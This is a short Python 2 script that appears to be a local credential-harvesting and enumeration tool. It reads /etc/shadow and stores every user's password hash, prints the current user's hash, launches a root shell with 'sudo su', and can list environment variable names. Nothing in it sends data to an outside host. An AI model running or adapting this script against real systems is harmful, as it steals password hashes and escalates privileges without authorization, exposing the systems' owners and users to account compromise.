import utils
import time
import sys
import os

credentials = {}
name = os.getlogin()            # Get the username context this program runs in
uid = os.geteuid()              # Get the effective user id (good to know)
print 'Current User: %s [UID:%d]' % (name, uid)

try:
    for line in utils.cmd('cat /etc/shadow', False):
        username = line.split(':')[0]
        passhash = line.split(':')[1]
        credentials[username] = passhash
except OSError:
    print '[!!] Unable to read shadow file'
    pass

if name in credentials:
    print '[*] Found hashed password for current user %s:' % name
    print credentials[name]

# Launch a shell
os.system('sudo su')

if 'system' in sys.argv:
    # System Enumeration
    print 'Environment Vars:'
    env = os.environ
    for k in env:
        print k
